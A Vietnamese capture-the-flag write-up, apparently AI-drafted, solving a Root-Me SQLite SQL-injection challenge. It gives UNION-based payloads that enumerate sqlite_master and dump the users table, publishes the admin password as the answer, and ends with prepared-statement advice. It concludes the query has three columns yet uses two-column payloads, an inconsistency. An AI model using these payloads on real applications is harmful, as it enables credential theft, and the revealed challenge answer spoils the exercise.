** Root-Me Write-up: SQL Injection - Authentication (SQLite)**

### 📋 Thông tin Challenge
- **Platform**: Root-Me  
- **Challenge**: SQL Injection - Authentication  
- **Database**: SQLite  
- **Mục tiêu**: Bypass xác thực để lấy password của tài khoản admin.

---

### 🔍 Khai thác ban đầu

Khi kiểm tra source code, thấy phần xử lý input username/password có vấn đề:
- Giá trị được gán không đúng (username và password cùng gán vào biến `name`).
- Không có tài khoản nào thỏa mãn điều kiện đăng nhập mặc định.

Phần contents của trang có tham số trên URL là vị trí dễ bị tấn công nhất.

**Test payload đầu tiên**:
```
'
```
→ Nhận lỗi:
> Warning: SQLite3::query(): Unable to prepare statement: 1, unrecognized token: "'''" ...

**Bypass lỗi**: Thêm comment `--`  
→ Lỗi biến mất, xác nhận có thể khai thác SQLi.

---

### 📊 Xác định số cột

Sử dụng `ORDER BY` để tìm số cột của bảng:

- `ORDER BY 1`, `ORDER BY 2` → OK  
- `ORDER BY 3` → OK  
- `ORDER BY 4` → Lỗi

**Kết luận**: Bảng đang query có **3 cột**.

---

### 🔎 Khám phá Database (SQLite)

Payload lấy danh sách bảng:

```sql
' UNION SELECT name, null FROM sqlite_master;--
```

→ Phát hiện bảng **`users`**.

Lấy cấu trúc bảng:

```sql
' UNION SELECT sql, NULL FROM sqlite_master 
WHERE type='table' AND name='users';--
```

Kết quả:
```sql
CREATE TABLE users(username TEXT, password TEXT, Year INTEGER)
```

---

### 💉 Dump dữ liệu

**Lấy toàn bộ username & password**:

```sql
' UNION SELECT username, password FROM users;--
```

Kết quả:
- Username: `admin`
- Password ban đầu trả về: `R78gsyd34dzf` (không đúng khi login)

**Lọc chính xác theo admin**:

```sql
' UNION SELECT username, password FROM users WHERE username='admin';--
```

→ Password đúng: **`t0_W34k!$`**

---

### ✅ Kết quả

- **Username**: `admin`
- **Password**: `t0_W34k!$`

Đăng nhập thành công với thông tin trên.

---

### 📌 Kỹ thuật đã sử dụng

- Error-based SQL Injection
- UNION-based SQL Injection
- Information Schema qua `sqlite_master`
- Comment `--` để bypass
- Xác định số cột bằng `ORDER BY`
- WHERE clause để lọc dữ liệu chính xác

---

### 🛡️ Khuyến nghị bảo mật

- Sử dụng **Prepared Statements** / Parameterized Queries.
- Không nối chuỗi trực tiếp vào câu lệnh SQL.
- Ẩn thông báo lỗi chi tiết ở môi trường production.
- Sử dụng ORM hoặc framework có cơ chế chống SQLi tốt (ví dụ: PDO với bindParam).

---

**Write-up by**: Tú  
**Date**: May 2026

---

Bạn có thể copy nội dung Markdown trên để đăng lên GitHub. Nếu muốn thêm ảnh minh họa (screenshot payload, lỗi, kết quả), mình có thể bổ sung phần **Screenshots** cho bạn.
